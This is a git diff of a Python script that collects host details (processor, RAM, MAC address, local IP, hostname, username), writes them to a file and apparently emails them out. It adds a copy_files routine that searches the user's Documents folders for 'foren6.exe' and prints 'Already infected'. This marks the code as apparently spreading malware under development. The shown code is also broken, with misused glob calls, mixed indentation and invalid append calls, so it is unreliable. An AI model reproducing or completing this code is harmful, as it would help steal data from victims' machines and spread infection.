@@ -14,6 +14,10 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 import glob
+from shutil import copyfile
+import getpass
+
+
 
 system = platform.system()
 
@@ -146,6 +150,22 @@ def send_info1(time_wait, data):
 		print("email sent")
 		time.sleep(time_wait)
 
+def copy_files(time):
+	time.sleep(time)
+	username = getpass.getuser()
+	a = glob(f"C:\\Users\\{username}\\Documents\\*\\")
+	for b in a:
+		for file in glob(f"{b}\\*"):
+			print(file)
+        	if file == f"{b}foren6.exe":
+				print("Already infected")
+
+    	print(".")
+	
+
+
+
+
 
 def system_info():
 	print("getting system info")
@@ -157,12 +177,13 @@ def system_info():
 	mac_address = "MAC ADDRESS: "+':'.join(re.findall('..', '%012x' % uuid.getnode()))
 	local_ip = "Local ip: "+socket.gethostbyname(socket.gethostname())
 	host_name = "host name: "+socket.gethostname()
-
-	system_info_list.append(processor)
-	system_info_list.append(ram)
-	system_info_list.append(mac_address)
-	system_info_list.append(local_ip)
-	system_info_list.append(host_name)
+	username = getpass.getuser()
+	system_info_list.append("USER |",username)
+	system_info_list.append("PROCESSOR |",processor)
+	system_info_list.append("RAM |",ram)
+	system_info_list.append("MAC ADDRESS |",mac_address)
+	system_info_list.append("LOCAL IP |",local_ip)
+	system_info_list.append("HOST NAME |",host_name)
 	
 	system_info_file = open("System_Info.txt", "w")
 	for info in system_info_list:
